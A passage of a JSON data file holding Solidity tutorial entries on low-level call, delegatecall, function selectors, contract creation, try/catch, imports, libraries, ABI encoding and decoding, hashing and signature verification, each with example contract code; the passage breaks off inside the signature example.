    "content": "`call` is a low level function to interact with other contracts.\n\nThis is the recommended method to use when you're just sending Ether via calling the `fallback` function.\n\nHowever it is not the recommended way to call existing functions.\n\n### Few reasons why low-level call is not recommended\n\n- Reverts are not bubbled up\n- Type checks are bypassed\n- Function existence checks are omitted\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Receiver {\n    event Received(address caller, uint256 amount, string message);\n\n    fallback() external payable {\n        emit Received(msg.sender, msg.value, \"Fallback was called\");\n    }\n\n    function foo(string memory _message, uint256 _x)\n        public\n        payable\n        returns (uint256)\n    {\n        emit Received(msg.sender, msg.value, _message);\n\n        return _x + 1;\n    }\n}\n\ncontract Caller {\n    event Response(bool success, bytes data);\n\n    // Let's imagine that contract Caller does not have the source code for the\n    // contract Receiver, but we do know the address of contract Receiver and the function to call.\n    function testCallFoo(address payable _addr) public payable {\n        // You can send ether and specify a custom gas amount\n        (bool success, bytes memory data) = _addr.call{\n            value: msg.value,\n            gas: 5000\n        }(abi.encodeWithSignature(\"foo(string,uint256)\", \"call foo\", 123));\n\n        emit Response(success, data);\n    }\n\n    // Calling a function that does not exist triggers the fallback function.\n    function testCallDoesNotExist(address payable _addr) public payable {\n        (bool success, bytes memory data) = _addr.call{value: msg.value}(\n            abi.encodeWithSignature(\"doesNotExist()\")\n        );\n\n        emit Response(success, data);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Call.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Receiver {\n    event Received(address caller, uint256 amount, string message);\n\n    fallback() external payable {\n        emit Received(msg.sender, msg.value, \"Fallback was called\");\n    }\n\n    function foo(string memory _message, uint256 _x)\n        public\n        payable\n        returns (uint256)\n    {\n        emit Received(msg.sender, msg.value, _message);\n\n        return _x + 1;\n    }\n}\n\ncontract Caller {\n    event Response(bool success, bytes data);\n\n    // Let's imagine that contract Caller does not have the source code for the\n    // contract Receiver, but we do know the address of contract Receiver and the function to call.\n    function testCallFoo(address payable _addr) public payable {\n        // You can send ether and specify a custom gas amount\n        (bool success, bytes memory data) = _addr.call{\n            value: msg.value,\n            gas: 5000\n        }(abi.encodeWithSignature(\"foo(string,uint256)\", \"call foo\", 123));\n\n        emit Response(success, data);\n    }\n\n    // Calling a function that does not exist triggers the fallback function.\n    function testCallDoesNotExist(address payable _addr) public payable {\n        (bool success, bytes memory data) = _addr.call{value: msg.value}(\n            abi.encodeWithSignature(\"doesNotExist()\")\n        );\n\n        emit Response(success, data);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "contract",
      "contracts",
      "call",
      "function",
      "functions"
    ],
    "order": 33
  },
  {
    "slug": "delegatecall",
    "title": "Delegatecall",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how to use delegatecall in Solidity",
    "content": "`delegatecall` is a low level function similar to `call`.\n\nWhen contract `A` executes `delegatecall` to contract `B`, `B`'s code is executed\n\nwith contract `A`'s storage, `msg.sender` and `msg.value`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// NOTE: Deploy this contract first\ncontract B {\n    // NOTE: storage layout must be the same as contract A\n    uint256 public num;\n    address public sender;\n    uint256 public value;\n\n    function setVars(uint256 _num) public payable {\n        num = _num;\n        sender = msg.sender;\n        value = msg.value;\n    }\n}\n\ncontract A {\n    uint256 public num;\n    address public sender;\n    uint256 public value;\n\n    event DelegateResponse(bool success, bytes data);\n    event CallResponse(bool success, bytes data);\n\n    // Function using delegatecall\n    function setVarsDelegateCall(address _contract, uint256 _num)\n        public\n        payable\n    {\n        // A's storage is set; B's storage is not modified.\n        (bool success, bytes memory data) = _contract.delegatecall(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n\n        emit DelegateResponse(success, data);\n    }\n\n    // Function using call\n    function setVarsCall(address _contract, uint256 _num) public payable {\n        // B's storage is set; A's storage is not modified.\n        (bool success, bytes memory data) = _contract.call{value: msg.value}(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n\n        emit CallResponse(success, data);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Delegatecall.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// NOTE: Deploy this contract first\ncontract B {\n    // NOTE: storage layout must be the same as contract A\n    uint256 public num;\n    address public sender;\n    uint256 public value;\n\n    function setVars(uint256 _num) public payable {\n        num = _num;\n        sender = msg.sender;\n        value = msg.value;\n    }\n}\n\ncontract A {\n    uint256 public num;\n    address public sender;\n    uint256 public value;\n\n    event DelegateResponse(bool success, bytes data);\n    event CallResponse(bool success, bytes data);\n\n    // Function using delegatecall\n    function setVarsDelegateCall(address _contract, uint256 _num)\n        public\n        payable\n    {\n        // A's storage is set; B's storage is not modified.\n        (bool success, bytes memory data) = _contract.delegatecall(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n\n        emit DelegateResponse(success, data);\n    }\n\n    // Function using call\n    function setVarsCall(address _contract, uint256 _num) public payable {\n        // B's storage is set; A's storage is not modified.\n        (bool success, bytes memory data) = _contract.call{value: msg.value}(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n\n        emit CallResponse(success, data);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "delegatecall",
      "call",
      "contract",
      "contracts",
      "function",
      "functions"
    ],
    "order": 34
  },
  {
    "slug": "function-selector",
    "title": "Function Selector",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how function selectors are computed",
    "content": "When a function is called, the first 4 bytes of `calldata` specifies which function to call.\n\nThis 4 bytes is called a function selector.\n\nTake, for example, this code below. It uses `call` to execute `transfer` on a contract at the address `addr`.\n\n```solidity\naddr.call(abi.encodeWithSignature(\"transfer(address,uint256)\", 0xSomeAddress, 123))\n```\n\nThe first 4 bytes returned from `abi.encodeWithSignature(....)` is the function selector.\n\nPerhaps you can save a tiny amount of gas if you precompute and inline the function selector in your code?\n\nHere is how the function selector is computed.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract FunctionSelector {\n    /*\n    \"transfer(address,uint256)\"\n    0xa9059cbb\n    \"transferFrom(address,address,uint256)\"\n    0x23b872dd\n    */\n    function getSelector(string calldata _func)\n        external\n        pure\n        returns (bytes4)\n    {\n        return bytes4(keccak256(bytes(_func)));\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "FunctionSelector.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract FunctionSelector {\n    /*\n    \"transfer(address,uint256)\"\n    0xa9059cbb\n    \"transferFrom(address,address,uint256)\"\n    0x23b872dd\n    */\n    function getSelector(string calldata _func)\n        external\n        pure\n        returns (bytes4)\n    {\n        return bytes4(keccak256(bytes(_func)));\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "function",
      "functions",
      "selector",
      "selectors"
    ],
    "order": 35
  },
  {
    "slug": "calling-contract",
    "title": "Calling Other Contract",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "In Solidity, contract can call other contracts in several ways",
    "content": "Contract can call other contracts in 2 ways.\n\nThe easiest way is to just call it, like `A.foo(x, y, z)`.\n\nAnother way to call other contracts is to use the low-level `call`.\n\nThis method is not recommended.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Callee {\n    uint256 public x;\n    uint256 public value;\n\n    function setX(uint256 _x) public returns (uint256) {\n        x = _x;\n        return x;\n    }\n\n    function setXandSendEther(uint256 _x)\n        public\n        payable\n        returns (uint256, uint256)\n    {\n        x = _x;\n        value = msg.value;\n\n        return (x, value);\n    }\n}\n\ncontract Caller {\n    function setX(Callee _callee, uint256 _x) public {\n        uint256 x = _callee.setX(_x);\n    }\n\n    function setXFromAddress(address _addr, uint256 _x) public {\n        Callee callee = Callee(_addr);\n        callee.setX(_x);\n    }\n\n    function setXandSendEther(Callee _callee, uint256 _x) public payable {\n        (uint256 x, uint256 value) =\n            _callee.setXandSendEther{value: msg.value}(_x);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "CallingContract.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Callee {\n    uint256 public x;\n    uint256 public value;\n\n    function setX(uint256 _x) public returns (uint256) {\n        x = _x;\n        return x;\n    }\n\n    function setXandSendEther(uint256 _x)\n        public\n        payable\n        returns (uint256, uint256)\n    {\n        x = _x;\n        value = msg.value;\n\n        return (x, value);\n    }\n}\n\ncontract Caller {\n    function setX(Callee _callee, uint256 _x) public {\n        uint256 x = _callee.setX(_x);\n    }\n\n    function setXFromAddress(address _addr, uint256 _x) public {\n        Callee callee = Callee(_addr);\n        callee.setX(_x);\n    }\n\n    function setXandSendEther(Callee _callee, uint256 _x) public payable {\n        (uint256 x, uint256 value) =\n            _callee.setXandSendEther{value: msg.value}(_x);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "calling",
      "other",
      "contract",
      "contracts",
      "call",
      "function",
      "functions"
    ],
    "order": 36
  },
  {
    "slug": "new-contract",
    "title": "Contract that Creates other Contracts",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Learn how to create new contracts from inside of a contract with Solidity",
    "content": "Contracts can be created by other contracts using the `new` keyword. Since 0.8.0, `new` keyword supports `create2` feature by specifying `salt` options.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Car {\n    address public owner;\n    string public model;\n    address public carAddr;\n\n    constructor(address _owner, string memory _model) payable {\n        owner = _owner;\n        model = _model;\n        carAddr = address(this);\n    }\n}\n\ncontract CarFactory {\n    Car[] public cars;\n\n    function create(address _owner, string memory _model) public {\n        Car car = new Car(_owner, _model);\n        cars.push(car);\n    }\n\n    function createAndSendEther(address _owner, string memory _model)\n        public\n        payable\n    {\n        Car car = (new Car){value: msg.value}(_owner, _model);\n        cars.push(car);\n    }\n\n    function create2(address _owner, string memory _model, bytes32 _salt)\n        public\n    {\n        Car car = (new Car){salt: _salt}(_owner, _model);\n        cars.push(car);\n    }\n\n    function create2AndSendEther(\n        address _owner,\n        string memory _model,\n        bytes32 _salt\n    ) public payable {\n        Car car = (new Car){value: msg.value, salt: _salt}(_owner, _model);\n        cars.push(car);\n    }\n\n    function getCar(uint256 _index)\n        public\n        view\n        returns (\n            address owner,\n            string memory model,\n            address carAddr,\n            uint256 balance\n        )\n    {\n        Car car = cars[_index];\n\n        return (car.owner(), car.model(), car.carAddr(), address(car).balance);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "NewContract.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Car {\n    address public owner;\n    string public model;\n    address public carAddr;\n\n    constructor(address _owner, string memory _model) payable {\n        owner = _owner;\n        model = _model;\n        carAddr = address(this);\n    }\n}\n\ncontract CarFactory {\n    Car[] public cars;\n\n    function create(address _owner, string memory _model) public {\n        Car car = new Car(_owner, _model);\n        cars.push(car);\n    }\n\n    function createAndSendEther(address _owner, string memory _model)\n        public\n        payable\n    {\n        Car car = (new Car){value: msg.value}(_owner, _model);\n        cars.push(car);\n    }\n\n    function create2(address _owner, string memory _model, bytes32 _salt)\n        public\n    {\n        Car car = (new Car){salt: _salt}(_owner, _model);\n        cars.push(car);\n    }\n\n    function create2AndSendEther(\n        address _owner,\n        string memory _model,\n        bytes32 _salt\n    ) public payable {\n        Car car = (new Car){value: msg.value, salt: _salt}(_owner, _model);\n        cars.push(car);\n    }\n\n    function getCar(uint256 _index)\n        public\n        view\n        returns (\n            address owner,\n            string memory model,\n            address carAddr,\n            uint256 balance\n        )\n    {\n        Car car = cars[_index];\n\n        return (car.owner(), car.model(), car.carAddr(), address(car).balance);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "new",
      "contract",
      "create",
      "contracts",
      "creates",
      "new",
      "create2",
      "salt"
    ],
    "order": 37
  },
  {
    "slug": "try-catch",
    "title": "Try Catch",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of try / catch in Solidity",
    "content": "`try / catch` can only catch errors from external function calls and contract creation.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// External contract used for try / catch examples\ncontract Foo {\n    address public owner;\n\n    constructor(address _owner) {\n        require(_owner != address(0), \"invalid address\");\n        assert(_owner != 0x0000000000000000000000000000000000000001);\n        owner = _owner;\n    }\n\n    function myFunc(uint256 x) public pure returns (string memory) {\n        require(x != 0, \"require failed\");\n        return \"my func was called\";\n    }\n}\n\ncontract Bar {\n    event Log(string message);\n    event LogBytes(bytes data);\n\n    Foo public foo;\n\n    constructor() {\n        // This Foo contract is used for example of try catch with external call\n        foo = new Foo(msg.sender);\n    }\n\n    // Example of try / catch with external call\n    // tryCatchExternalCall(0) => Log(\"external call failed\")\n    // tryCatchExternalCall(1) => Log(\"my func was called\")\n    function tryCatchExternalCall(uint256 _i) public {\n        try foo.myFunc(_i) returns (string memory result) {\n            emit Log(result);\n        } catch {\n            emit Log(\"external call failed\");\n        }\n    }\n\n    // Example of try / catch with contract creation\n    // tryCatchNewContract(0x0000000000000000000000000000000000000000) => Log(\"invalid address\")\n    // tryCatchNewContract(0x0000000000000000000000000000000000000001) => LogBytes(\"\")\n    // tryCatchNewContract(0x0000000000000000000000000000000000000002) => Log(\"Foo created\")\n    function tryCatchNewContract(address _owner) public {\n        try new Foo(_owner) returns (Foo foo) {\n            // you can use variable foo here\n            emit Log(\"Foo created\");\n        } catch Error(string memory reason) {\n            // catch failing revert() and require()\n            emit Log(reason);\n        } catch (bytes memory reason) {\n            // catch failing assert()\n            emit LogBytes(reason);\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "TryCatch.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// External contract used for try / catch examples\ncontract Foo {\n    address public owner;\n\n    constructor(address _owner) {\n        require(_owner != address(0), \"invalid address\");\n        assert(_owner != 0x0000000000000000000000000000000000000001);\n        owner = _owner;\n    }\n\n    function myFunc(uint256 x) public pure returns (string memory) {\n        require(x != 0, \"require failed\");\n        return \"my func was called\";\n    }\n}\n\ncontract Bar {\n    event Log(string message);\n    event LogBytes(bytes data);\n\n    Foo public foo;\n\n    constructor() {\n        // This Foo contract is used for example of try catch with external call\n        foo = new Foo(msg.sender);\n    }\n\n    // Example of try / catch with external call\n    // tryCatchExternalCall(0) => Log(\"external call failed\")\n    // tryCatchExternalCall(1) => Log(\"my func was called\")\n    function tryCatchExternalCall(uint256 _i) public {\n        try foo.myFunc(_i) returns (string memory result) {\n            emit Log(result);\n        } catch {\n            emit Log(\"external call failed\");\n        }\n    }\n\n    // Example of try / catch with contract creation\n    // tryCatchNewContract(0x0000000000000000000000000000000000000000) => Log(\"invalid address\")\n    // tryCatchNewContract(0x0000000000000000000000000000000000000001) => LogBytes(\"\")\n    // tryCatchNewContract(0x0000000000000000000000000000000000000002) => Log(\"Foo created\")\n    function tryCatchNewContract(address _owner) public {\n        try new Foo(_owner) returns (Foo foo) {\n            // you can use variable foo here\n            emit Log(\"Foo created\");\n        } catch Error(string memory reason) {\n            // catch failing revert() and require()\n            emit Log(reason);\n        } catch (bytes memory reason) {\n            // catch failing assert()\n            emit LogBytes(reason);\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "try",
      "catch",
      "error",
      "errors"
    ],
    "order": 38
  },
  {
    "slug": "import",
    "title": "Import",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Learn how to import other Solidity files",
    "content": "You can import local and external files in Solidity.\n\n### Local\n\nHere is our folder structure.\n\n```\n├── Import.sol\n└── Foo.sol\n```\n\nFoo.sol\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nstruct Point {\n    uint256 x;\n    uint256 y;\n}\n\nerror Unauthorized(address caller);\n\nfunction add(uint256 x, uint256 y) pure returns (uint256) {\n    return x + y;\n}\n\ncontract Foo {\n    string public name = \"Foo\";\n}\n\n```\n\nImport.sol\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// import Foo.sol from current directory\nimport \"./Foo.sol\";\n\n// import {symbol1 as alias, symbol2} from \"filename\";\nimport {Unauthorized, add as func, Point} from \"./Foo.sol\";\n\ncontract Import {\n    // Initialize Foo.sol\n    Foo public foo = new Foo();\n\n    // Test Foo.sol by getting its name.\n    function getFooName() public view returns (string memory) {\n        return foo.name();\n    }\n}\n\n```\n\n### External\n\nYou can also import from [GitHub](https://github.com) by simply copying the url\n\n```solidity\n// https://github.com/owner/repo/blob/branch/path/to/Contract.sol\nimport \"https://github.com/owner/repo/blob/branch/path/to/Contract.sol\";\n\n// Example import ECDSA.sol from openzeppelin-contract repo, release-v4.5 branch\n// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol\";\n```",
    "codes": [
      {
        "fileName": "Foo.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nstruct Point {\n    uint256 x;\n    uint256 y;\n}\n\nerror Unauthorized(address caller);\n\nfunction add(uint256 x, uint256 y) pure returns (uint256) {\n    return x + y;\n}\n\ncontract Foo {\n    string public name = \"Foo\";\n}\n"
      },
      {
        "fileName": "Import.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// import Foo.sol from current directory\nimport \"./Foo.sol\";\n\n// import {symbol1 as alias, symbol2} from \"filename\";\nimport {Unauthorized, add as func, Point} from \"./Foo.sol\";\n\ncontract Import {\n    // Initialize Foo.sol\n    Foo public foo = new Foo();\n\n    // Test Foo.sol by getting its name.\n    function getFooName() public view returns (string memory) {\n        return foo.name();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "import"
    ],
    "order": 39
  },
  {
    "slug": "library",
    "title": "Library",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how to write and use libraries in your Solidity code",
    "content": "Libraries are similar to contracts, but you can't declare any state variables and\nyou can't send ether.\n\nA library is embedded into the contract if all library functions are internal.\n\nOtherwise the library must be deployed and then linked before the contract is deployed.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nlibrary Math {\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n        // else z = 0 (default value)\n    }\n}\n\ncontract TestMath {\n    function testSquareRoot(uint256 x) public pure returns (uint256) {\n        return Math.sqrt(x);\n    }\n}\n\n// Array function to delete element at index and re-organize the array\n// so that there are no gaps between the elements.\nlibrary Array {\n    function remove(uint256[] storage arr, uint256 index) public {\n        // Move the last element into the place to delete\n        require(arr.length > 0, \"Can't remove from empty array\");\n        arr[index] = arr[arr.length - 1];\n        arr.pop();\n    }\n}\n\ncontract TestArray {\n    using Array for uint256[];\n\n    uint256[] public arr;\n\n    function testArrayRemove() public {\n        for (uint256 i = 0; i < 3; i++) {\n            arr.push(i);\n        }\n\n        arr.remove(1);\n\n        assert(arr.length == 2);\n        assert(arr[0] == 0);\n        assert(arr[1] == 2);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Library.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nlibrary Math {\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n        // else z = 0 (default value)\n    }\n}\n\ncontract TestMath {\n    function testSquareRoot(uint256 x) public pure returns (uint256) {\n        return Math.sqrt(x);\n    }\n}\n\n// Array function to delete element at index and re-organize the array\n// so that there are no gaps between the elements.\nlibrary Array {\n    function remove(uint256[] storage arr, uint256 index) public {\n        // Move the last element into the place to delete\n        require(arr.length > 0, \"Can't remove from empty array\");\n        arr[index] = arr[arr.length - 1];\n        arr.pop();\n    }\n}\n\ncontract TestArray {\n    using Array for uint256[];\n\n    uint256[] public arr;\n\n    function testArrayRemove() public {\n        for (uint256 i = 0; i < 3; i++) {\n            arr.push(i);\n        }\n\n        arr.remove(1);\n\n        assert(arr.length == 2);\n        assert(arr[0] == 0);\n        assert(arr[1] == 2);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "library"
    ],
    "order": 40
  },
  {
    "slug": "abi-encode",
    "title": "ABI Encode",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "ABI encode",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function transfer(address, uint256) external;\n}\n\ncontract Token {\n    function transfer(address, uint256) external {}\n}\n\ncontract AbiEncode {\n    function test(address _contract, bytes calldata data) external {\n        (bool ok,) = _contract.call(data);\n        require(ok, \"call failed\");\n    }\n\n    function encodeWithSignature(address to, uint256 amount)\n        external\n        pure\n        returns (bytes memory)\n    {\n        // Typo is not checked - \"transfer(address, uint)\"\n        return abi.encodeWithSignature(\"transfer(address,uint256)\", to, amount);\n    }\n\n    function encodeWithSelector(address to, uint256 amount)\n        external\n        pure\n        returns (bytes memory)\n    {\n        // Type is not checked - (IERC20.transfer.selector, true, amount)\n        return abi.encodeWithSelector(IERC20.transfer.selector, to, amount);\n    }\n\n    function encodeCall(address to, uint256 amount)\n        external\n        pure\n        returns (bytes memory)\n    {\n        // Typo and type errors will not compile\n        return abi.encodeCall(IERC20.transfer, (to, amount));\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AbiEncode.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function transfer(address, uint256) external;\n}\n\ncontract Token {\n    function transfer(address, uint256) external {}\n}\n\ncontract AbiEncode {\n    function test(address _contract, bytes calldata data) external {\n        (bool ok,) = _contract.call(data);\n        require(ok, \"call failed\");\n    }\n\n    function encodeWithSignature(address to, uint256 amount)\n        external\n        pure\n        returns (bytes memory)\n    {\n        // Typo is not checked - \"transfer(address, uint)\"\n        return abi.encodeWithSignature(\"transfer(address,uint256)\", to, amount);\n    }\n\n    function encodeWithSelector(address to, uint256 amount)\n        external\n        pure\n        returns (bytes memory)\n    {\n        // Type is not checked - (IERC20.transfer.selector, true, amount)\n        return abi.encodeWithSelector(IERC20.transfer.selector, to, amount);\n    }\n\n    function encodeCall(address to, uint256 amount)\n        external\n        pure\n        returns (bytes memory)\n    {\n        // Typo and type errors will not compile\n        return abi.encodeCall(IERC20.transfer, (to, amount));\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "abi",
      "encode",
      "bytes",
      "encodeWithSelector",
      "encodeWithSignature",
      "encodeCall"
    ],
    "order": 41
  },
  {
    "slug": "abi-decode",
    "title": "ABI Decode",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "ABI decode bytes",
    "content": "`abi.encode` encodes data into `bytes`.\n\n`abi.decode` decodes `bytes` back into data.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AbiDecode {\n    struct MyStruct {\n        string name;\n        uint256[2] nums;\n    }\n\n    function encode(\n        uint256 x,\n        address addr,\n        uint256[] calldata arr,\n        MyStruct calldata myStruct\n    ) external pure returns (bytes memory) {\n        return abi.encode(x, addr, arr, myStruct);\n    }\n\n    function decode(bytes calldata data)\n        external\n        pure\n        returns (\n            uint256 x,\n            address addr,\n            uint256[] memory arr,\n            MyStruct memory myStruct\n        )\n    {\n        // (uint x, address addr, uint[] memory arr, MyStruct myStruct) = ...\n        (x, addr, arr, myStruct) =\n            abi.decode(data, (uint256, address, uint256[], MyStruct));\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AbiDecode.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AbiDecode {\n    struct MyStruct {\n        string name;\n        uint256[2] nums;\n    }\n\n    function encode(\n        uint256 x,\n        address addr,\n        uint256[] calldata arr,\n        MyStruct calldata myStruct\n    ) external pure returns (bytes memory) {\n        return abi.encode(x, addr, arr, myStruct);\n    }\n\n    function decode(bytes calldata data)\n        external\n        pure\n        returns (\n            uint256 x,\n            address addr,\n            uint256[] memory arr,\n            MyStruct memory myStruct\n        )\n    {\n        // (uint x, address addr, uint[] memory arr, MyStruct myStruct) = ...\n        (x, addr, arr, myStruct) =\n            abi.decode(data, (uint256, address, uint256[], MyStruct));\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "abi",
      "decode",
      "bytes"
    ],
    "order": 42
  },
  {
    "slug": "hashing",
    "title": "Hashing with Keccak256",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of hashing using Keccak256 in Solidity",
    "content": "`keccak256` computes the Keccak-256 hash of the input.\n\nSome use cases are:\n\n- Creating a deterministic unique ID from an input\n- Commit-Reveal scheme\n- Compact cryptographic signature (by signing the hash instead of a larger input)\n\nSolidity provides two methods for encoding data:\n\n- `abi.encode`:\n  - Encodes data into bytes with padding\n  - Preserves all data information\n  - Safer when dealing with dynamic types\n  - Produces a longer output due to padding\n- `abi.encodePacked`:\n  - Performs packed encoding (compressed)\n  - Produces a shorter output than `abi.encode`\n  - More gas efficient\n  - Risk of hash collisions with dynamic types (`collision` function)\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract HashFunction {\n    function hash(string memory _text, uint256 _num, address _addr)\n        public\n        pure\n        returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(_text, _num, _addr));\n    }\n\n    // Example of hash collision\n    // Hash collision can occur when you pass more than one dynamic data type\n    // to abi.encodePacked. In such case, you should use abi.encode instead.\n    function collision(string memory _text, string memory _anotherText)\n        public\n        pure\n        returns (bytes32)\n    {\n        // encodePacked(AAA, BBB) -> AAABBB\n        // encodePacked(AA, ABBB) -> AAABBB\n        return keccak256(abi.encodePacked(_text, _anotherText));\n    }\n}\n\ncontract GuessTheMagicWord {\n    bytes32 public answer =\n        0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00;\n\n    // Magic word is \"Solidity\"\n    function guess(string memory _word) public view returns (bool) {\n        return keccak256(abi.encodePacked(_word)) == answer;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Keccak256.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract HashFunction {\n    function hash(string memory _text, uint256 _num, address _addr)\n        public\n        pure\n        returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(_text, _num, _addr));\n    }\n\n    // Example of hash collision\n    // Hash collision can occur when you pass more than one dynamic data type\n    // to abi.encodePacked. In such case, you should use abi.encode instead.\n    function collision(string memory _text, string memory _anotherText)\n        public\n        pure\n        returns (bytes32)\n    {\n        // encodePacked(AAA, BBB) -> AAABBB\n        // encodePacked(AA, ABBB) -> AAABBB\n        return keccak256(abi.encodePacked(_text, _anotherText));\n    }\n}\n\ncontract GuessTheMagicWord {\n    bytes32 public answer =\n        0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00;\n\n    // Magic word is \"Solidity\"\n    function guess(string memory _word) public view returns (bool) {\n        return keccak256(abi.encodePacked(_word)) == answer;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hash",
      "hashing",
      "function",
      "functions",
      "keccak256",
      "cryptography"
    ],
    "order": 43
  },
  {
    "slug": "signature",
    "title": "Verifying Signature",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of how to verify signatures in Solidity",
    "content": "Messages can be signed off chain and then verified on chain using a smart contract.\n\n[Example using ethers.js](https://github.com/t4sk/hello-erc20-permit/blob/main/test/verify-signature.js)\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/* Signature Verification\n\nHow to Sign and Verify\n# Signing\n1. Create message to sign\n2. Hash the message\n3. Sign the hash (off chain, keep your private key secret)\n\n# Verify\n1. Recreate hash from the original message\n2. Recover signer from signature and hash\n3. Compare recovered signer to claimed signer\n*/\n\ncontract VerifySignature {\n    /* 1. Unlock MetaMask account\n    ethereum.enable()\n    */\n\n    /* 2. Get message hash to sign\n    getMessageHash(\n        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,\n        123,\n        \"coffee and donuts\",\n        1\n    )\n\n    hash = \"0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd\"\n    */\n    function getMessageHash(\n        address _to,\n        uint256 _amount,\n        string memory _message,\n        uint256 _nonce\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_to, _amount, _message, _nonce));\n    }\n\n    /* 3. Sign message hash\n    # using a browser\n    account = \"copy and paste account of signer here\"\n    ethereum.request({ method: \"personal_sign\", params: [account, hash]}).then(console.log)\n\n    # using web3\n    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)\n\n    Signature will be different for different accounts\n    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function getEthSignedMessageHash(bytes32 _messageHash)\n        public\n        pure\n        returns (bytes32)\n    {\n        